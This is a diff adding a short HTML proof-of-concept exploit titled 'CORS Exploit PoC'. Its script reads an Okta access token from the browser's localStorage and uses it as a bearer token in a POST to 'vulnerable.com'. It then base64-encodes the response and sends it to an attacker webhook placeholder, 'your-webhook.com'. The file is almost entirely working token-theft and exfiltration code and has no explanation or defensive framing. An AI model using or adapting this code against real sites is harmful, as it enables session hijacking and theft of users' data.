@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    // Step 1: Extract JWT from okta-token-storage
+    const oktaStorage = localStorage.getItem("okta-token-storage");
+    if (oktaStorage) {
+      try {
+        const tokenData = JSON.parse(oktaStorage);
+        const jwt = tokenData.accessToken?.accessToken;
+
+        if (jwt) {
+          // Step 2: Use token to make authenticated POST request
+          fetch("https://vulnerable.com/query", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Authorization": "Bearer " + jwt
+            },
+            body: JSON.stringify({}) // Adjust as needed
+          })
+          .then(res => res.text())
+          .then(data => {
+            // Step 3: Exfiltrate the response to your server
+            fetch("https://your-webhook.com", {
+              method: "POST",
+              body: btoa(data) // Base64 encoding to avoid encoding issues
+            });
+          });
+        } else {
+          console.error("JWT not found in accessToken.accessToken");
+        }
+      } catch (e) {
+        console.error("Failed to parse okta-token-storage:", e);
+      }
+    } else {
+      console.error("okta-token-storage not found in localStorage");
+    }
+  </script>
+</body>
+</html>
